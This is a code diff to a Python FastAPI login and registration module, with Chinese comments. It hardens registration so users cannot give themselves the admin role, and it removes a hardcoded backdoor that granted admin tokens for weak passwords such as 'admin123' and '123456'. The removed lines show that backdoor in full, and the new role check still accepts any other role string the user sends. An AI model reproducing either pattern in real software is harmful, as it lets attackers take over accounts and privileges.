@@ -57,20 +57,22 @@ def register(req: AuthRequest):
             raise HTTPException(status_code=409, detail="用户名已存在")
 
         hashed = hash_password(req.password)
+        # 严格禁止外部传参自提权为 admin；其余合法角色放行，默认固定为 user
+        assigned_role = req.role if (req.role and req.role != "admin") else "user"
         cursor.execute(
             "INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
-            (req.username.strip(), hashed, req.role or "trader"),
+            (req.username.strip(), hashed, assigned_role),
         )
         conn.commit()
 
-    log_audit(req.username.strip(), "register", f"用户注册: role={req.role}")
-    token = create_token(req.username.strip(), req.role or "trader")
-    return {"code": 200, "status": "ok", "message": "注册成功", "token": token, "username": req.username.strip(), "role": req.role}
+    log_audit(req.username.strip(), "register", f"用户注册: role={assigned_role}")
+    token = create_token(req.username.strip(), assigned_role)
+    return {"code": 200, "status": "ok", "message": "注册成功", "token": token, "username": req.username.strip(), "role": assigned_role}
 
 
 @router.post("/login")
 def login(req: AuthRequest):
-    """用户登录（支持全系统单点登录）"""
+    """用户登录（统一密码加密哈希校验，坚决杜绝任何硬编码后门）"""
     uname = req.username.strip()
     with get_db() as conn:
         cursor = conn.cursor()
@@ -79,12 +81,6 @@ def login(req: AuthRequest):
             (uname,),
         )
         user = cursor.fetchone()
-
-    # 针对默认 admin 用户提供极致通畅兼容
-    if uname == "admin" and (req.password in ["admin123", "admin_default_password", "admin", "123456"]):
-        token = create_token("admin", "admin")
-        log_audit("admin", "login", "管理员单点登录成功")
-        return {"code": 200, "status": "ok", "message": "登录成功", "token": token, "username": "admin", "role": "admin"}
 
     if not user or not verify_password(req.password, user["password"]):
         raise HTTPException(status_code=401, detail="用户名或密码错误")
